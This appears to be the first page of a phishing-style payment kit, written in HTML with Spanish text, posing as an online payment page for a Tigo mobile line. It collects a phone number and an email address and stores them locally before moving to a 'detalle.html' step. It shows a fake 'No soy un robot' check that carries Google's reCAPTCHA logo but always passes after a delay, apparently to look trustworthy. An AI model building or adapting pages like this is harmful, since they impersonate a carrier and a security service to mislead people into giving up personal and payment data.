<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Paga en línea</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    /* (Todo tu estilo está intacto) */
    /* ...copiado igual, sin cambios para no hacerte perder nada */
  </style>
</head>
<body>

  <!-- Banner superior -->
  <img src="ban.jpeg" alt="" width="100%">
    
  <br><br><br><br>

  <!-- Formulario -->
  <div class="contenedor">
    <img src="pa.jpeg" alt="" width="100%">
    <br><br><br>

    <form id="pagoForm">
      <img src="nu.jpeg" alt="Imagen de número" width="100%">
      <input type="tel" id="numero" name="numero" placeholder="Línea Móvil Tigo" required>
      <br><br>
      <input type="email" id="email" name="email" placeholder="Correo electrónico" required>

      <img src="pre.jpeg" alt="Imagen de precios" width="100%">
      <br><br><br><br>

      <!-- CAPTCHA simulado -->
      <div class="captcha-simulacion" onclick="simularCaptcha()">
        <div class="captcha-left">
          <div class="captcha-checkbox" id="captchaCheckbox"></div>
          <div class="captcha-texto" id="captchaTexto">No soy un robot</div>
        </div>
        
        <div class="captcha-logo">
          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
          <span>reCAPTCHA</span>
          <a href="https://policies.google.com/privacy" target="_blank">Privacidad -Condiciones</a>
        </div>
      </div>
      <br><br>

      <!-- Botón -->
      <button id="botonContinuar" type="submit">Continuar</button>
    </form>
  </div>

  <br><br><br><br>

  <!-- Footer -->
  <footer>
    <img src="fin.jpeg" alt="Pie de página">
  </footer>

  <!-- Scripts -->
  <script>
    let captchaValidado = false;

    function simularCaptcha() {
      const checkbox = document.getElementById("captchaCheckbox");
      const texto = document.getElementById("captchaTexto");

      if (captchaValidado) return;

      texto.textContent = "Validando...";
      setTimeout(() => {
        checkbox.classList.add("checked");
        texto.textContent = "No soy un robot";
        captchaValidado = true;
      }, 1500);
    }

    function validarCaptcha() {
      if (!captchaValidado) {
        alert("Por favor verifica que no eres un robot.");
        return false;
      }
      return true;
    }

    document.getElementById("numero").addEventListener("input", function () {
      const boton = document.getElementById("botonContinuar");
      boton.classList.toggle("activo", this.value.trim() !== "");
    });

    document.getElementById("pagoForm").addEventListener("submit", function (e) {
      e.preventDefault();

      if (!validarCaptcha()) return;

      const numero = document.getElementById("numero").value;
      const email = document.getElementById("email").value;

      localStorage.setItem("numero", numero);
      localStorage.setItem("email", email);

      window.location.href = "detalle.html";
    });
  </script>

</body>
</html>
